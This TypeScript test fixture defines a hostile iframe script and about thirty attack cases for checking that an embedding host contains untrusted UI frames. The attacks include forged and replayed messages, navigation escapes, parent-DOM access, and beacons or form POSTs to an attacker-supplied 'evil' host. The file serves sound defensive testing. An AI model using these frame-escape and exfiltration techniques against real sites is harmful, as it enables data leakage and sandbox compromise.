export const FRAME_CASES = [
  { attack: "good", expectedState: "ready" },
  { attack: "editor-change", expectedState: "ready" },
  { attack: "editor-propose", expectedState: "ready" },
  { attack: "late-revoke", expectedState: "unavailable" },
  { attack: "mismatch", expectedState: "unavailable" },
  { attack: "throw", expectedState: "unavailable" },
  { attack: "forged", expectedState: "unavailable" },
  { attack: "replay", expectedState: "unavailable" },
  { attack: "wrong-release", expectedState: "unavailable" },
  { attack: "wrong-generation", expectedState: "unavailable" },
  { attack: "wrong-connection", expectedState: "unavailable" },
  { attack: "unknown-field", expectedState: "unavailable" },
  { attack: "before-ready", expectedState: "unavailable" },
  { attack: "cross-connection", expectedState: "unavailable" },
  { attack: "ambient", expectedState: "ready" },
  { attack: "navigate", expectedState: "unavailable" },
  { attack: "before-load", expectedState: "unavailable" },
  { attack: "remote", expectedState: "unavailable" },
  { attack: "data", expectedState: "unavailable" },
  { attack: "blob", expectedState: "unavailable" },
  { attack: "redirect", expectedState: "unavailable" },
  { attack: "fetch", expectedState: "ready" },
  { attack: "image", expectedState: "ready" },
  { attack: "font", expectedState: "ready" },
  { attack: "style", expectedState: "ready" },
  { attack: "worker", expectedState: "ready" },
  { attack: "service-worker", expectedState: "ready" },
  { attack: "parent", expectedState: "ready" },
  { attack: "form", expectedState: "ready" },
  { attack: "popup", expectedState: "ready" },
  { attack: "download", expectedState: "unavailable" },
  { attack: "top", expectedState: "ready" },
] as const;
export const FRAME_ATTACKS = FRAME_CASES.map(item => item.attack);
export type FrameAttack = typeof FRAME_CASES[number]["attack"];

function hostileUi(attack: FrameAttack, evil: string): void {
  const report = (value: string): void => { console.log(`FRAME_PROBE:${value}`); };
  if (attack === "before-load" && !location.pathname.includes("connection-other")) {
    report("before-load");
    location.replace(location.href.replace("connection-example", "connection-other"));
    return;
  }
  if (attack === "throw") { report("throw"); throw new Error("synthetic_render_failure"); }
  addEventListener("message", event => {
    if (event.source !== parent || event.data?.type !== "host:init" || event.ports.length !== 1) return;
    const init = event.data as Record<string, unknown>;
    const port = event.ports[0]!;
    let seq = 0;
    const send = (type: string, body: unknown, extra: Record<string, unknown> = {}): void => { port.postMessage({ ...init, type, body, seq: ++seq, ...extra }); };
    let edited = false;
    port.onmessage = event => {
      if (event.data.type === "host:draft") {
        const draft = event.data.body;
        if (attack === "editor-change" && !edited) {
          edited = true;
          report(attack);
          send("draft:change", { draftId: draft.draftId, baseRevision: draft.revision, changes: [{ pointer: "/title", change: { kind: "set", value: "Browser principal edit" } }] });
        } else if (attack === "editor-change") document.body.dataset.edited = draft.values["/title"];
        if (attack === "editor-propose" && !edited) {
          edited = true;
          report(attack);
          send("action:propose", { draftId: draft.draftId, revision: draft.revision });
        }
        return;
      }
      if (event.data.type !== "host:projection") return;
      document.body.dataset.projected = "yes";
      if (document.body.dataset.attacked) return;
      document.body.dataset.attacked = "yes";
      report(attack);
      const img = (): HTMLImageElement => { const image = new Image(); image.src = evil + "/image"; document.body.append(image); return image; };
      try {
        switch (attack) {
          case "forged": send("ui:resize", { height: 1 }, { instance: "0".repeat(32) }); break;
          case "replay": send("ui:resize", { height: 1 }, { seq: 1 }); break;
          case "wrong-release": send("ui:resize", { height: 1 }, { releaseDigest: "0".repeat(64) }); break;
          case "wrong-generation": send("ui:resize", { height: 1 }, { generationId: "cached-generation" }); break;
          case "wrong-connection": send("ui:resize", { height: 1 }, { connectionId: "connection-other" }); break;
          case "unknown-field": send("ui:resize", { height: 1 }, { callback: "execute" }); break;
          case "cross-connection": send("ui:navigate", { target: { kind: "object", ref: { adapterId: init.adapterId, connectionId: "connection-other", objectType: "task", canonicalId: "foreign" } } }); break;
          case "ambient": parent.postMessage({ ...init, seq: 3, type: "action:propose", body: { draftId: "forged", revision: 1 } }, "*"); break;
          case "navigate": location.reload(); break;
          case "remote": location.assign(evil + "/remote"); break;
          case "data": location.assign("data:text/html,hostile-navigation"); break;
          case "blob": location.assign(URL.createObjectURL(new Blob(["hostile"], { type: "text/html" }))); break;
          case "redirect": location.assign(new URL("redirect.html", location.href).href); break;
          case "fetch": void fetch(evil + "/fetch").then(() => report("fetch-allowed"), () => report("fetch-denied")); break;
          case "image": img(); break;
          case "font": { const font = new FontFace("beacon", `url(${evil}/font)`); void font.load().catch(() => report("font-denied")); break; }
          case "style": { const link = document.createElement("link"); link.rel = "stylesheet"; link.href = evil + "/style"; document.head.append(link); break; }
          case "worker": {
            const worker = new Worker(URL.createObjectURL(new Blob([`postMessage('running');fetch(${JSON.stringify(evil)})`], { type: "text/javascript" })));
            worker.onmessage = () => report("worker-allowed");
            worker.onerror = () => report("worker-denied");
            break;
          }
          case "service-worker": void navigator.serviceWorker.register(evil + "/service-worker.js").then(() => report("service-worker-allowed"), () => report("service-worker-denied")); break;
          case "parent": { const p = parent.document; p.body.dataset.compromised = "yes"; break; }
          case "form": { const form = document.createElement("form"); form.action = evil + "/form"; form.method = "POST"; document.body.append(form); form.submit(); break; }
          case "popup": window.open(evil + "/popup"); break;
          case "download": { const a = document.createElement("a"); a.href = evil + "/download"; a.download = "leak"; a.click(); break; }
          case "top": top!.location.href = evil + "/top"; break;
          default: break;
        }
      } catch (error) { report(`${attack}-denied`); report(error instanceof Error ? error.name : "denied"); }
    };
    port.start();
    if (attack === "mismatch" || attack === "before-ready" || attack === "late-revoke") report(attack);
    if (attack === "before-ready") send("ui:resize", { height: 1 });
    else send("ui:ready", init.body, attack === "mismatch" ? { version: "2.0.0" } : {});
  });
}

export const hostileFrameScript = (attack: FrameAttack, evil: string): string => `(${hostileUi.toString()})(${JSON.stringify(attack)},${JSON.stringify(evil)});`;
